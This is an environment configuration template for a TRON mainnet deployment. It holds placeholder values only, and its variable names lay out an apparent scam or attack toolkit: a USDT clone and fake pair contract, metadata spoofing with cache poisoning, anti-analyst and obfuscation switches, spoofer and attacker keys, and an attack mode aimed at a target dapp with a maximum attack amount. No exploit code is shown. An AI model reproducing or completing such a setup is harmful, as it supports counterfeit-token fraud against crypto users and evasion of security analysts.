# Network Configuration
NETWORK=mainnet
TRON_FULL_NODE=https://api.trongrid.io
TRON_SOLIDITY_NODE=https://api.trongrid.io
TRON_EVENT_SERVER=https://api.trongrid.io

# Deployment Configuration
DEPLOYER_PRIVATE_KEY=your_deployer_private_key_here
DEPLOYER_ADDRESS=your_deployer_address_here

# Contract Addresses (populated after deployment)
USDT_CLONE_ADDRESS=
FAKE_PAIR_ADDRESS=
GHOST_FORK_ADDRESS=
QUANTUM_STATE_ADDRESS=
AI_OBFUSCATOR_ADDRESS=
PROXY_MESH_ADDRESS=
ZK_UPGRADER_ADDRESS=

# Bot Private Keys
BOT_PRIVATE_KEY=your_bot_private_key_here
SPOOFER_PRIVATE_KEY=your_spoofer_private_key_here
ANTI_ANALYST_PRIVATE_KEY=your_anti_analyst_private_key_here
ATTACKER_PRIVATE_KEY=your_attacker_private_key_here

# Test Mode
TEST_MODE=false

# API Keys (optional)
TRONSCAN_API_KEY=
COINGECKO_API_KEY=

# Logging
LOG_LEVEL=info
LOG_DIR=./logs

# Security
ENABLE_ANTI_ANALYST=true
ENABLE_OBFUSCATION=true
ENABLE_QUANTUM_STATES=true

# Liquidity Bot Settings
LP_BOT_INTERVAL=60
LP_BOT_MIN_BALANCE=1000000000
LP_BOT_PRICE_THRESHOLD=0.001

# Metadata Spoofing
METADATA_ROTATION_INTERVAL=3600
METADATA_CACHE_POISON=true

# Attack Configuration (use with caution)
ATTACK_MODE=false
TARGET_DAPP_ADDRESS=
MAX_ATTACK_AMOUNT=1000000000